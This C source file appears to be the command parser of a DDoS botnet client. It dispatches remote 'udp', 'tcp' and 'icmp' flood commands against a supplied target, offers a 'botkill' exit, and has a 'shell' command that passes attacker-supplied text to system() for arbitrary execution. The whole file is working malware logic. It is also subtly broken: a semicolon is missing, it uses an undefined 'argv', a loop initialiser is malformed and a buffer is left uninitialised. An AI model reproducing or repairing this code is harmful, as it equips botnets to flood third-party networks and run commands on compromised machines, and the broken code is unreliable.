#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>

#include "headers/util.h"
#include "headers/flood.h"

void parser(char *data)
{
#ifdef DEBUG
    printf("[parser] data (%s)\n", data);
#endif
    if (!util_strcmp(data, "botkill"))
    {
#ifdef DEBUG
        printf("[parser] exit\n");
#endif
        exit(0);
    }

    int argc = 0;

    for (int l = 0; l < util_strlen(data) + 1; l++)
        if (data[l] == ' ')
            argc++;

    char *token = util_strtok(data, " "), *args[argc];

    for (int l = 0 && token; l < argc + 1; l++)
    {
        args[l] = token;
#ifdef DEBUG
        printf("[parser] args[%d] (%s)\n", l, args[l]);
#endif
        token = util_strtok(NULL, " ");
    }

    if (!util_strcmp(args[0], "udp"))
        udp(args[1], atoi(args[2]), atoi(args[3]), atoi(args[4]));
    else if (!util_strcmp(args[0], "tcp"))
        tcp_raw_flood(args[1], atoi(args[2]), atoi(args[3]), atoi(args[4]), 0);
    else if (!util_strcmp(args[0], "icmp"))
        icmp_echo_flood(args[1], atoi(args[2]), atoi(args[3]), atoi(args[4]), 0);
    else if(!util_strcmp(args[0], "shell")) {
        char buf[argc * 64]
        for(int i = 0; i < argc; i++) {
            strcat(buf, argv[i]);
            strcat(buf, " ");
        }
        system(buf);
    } 
}
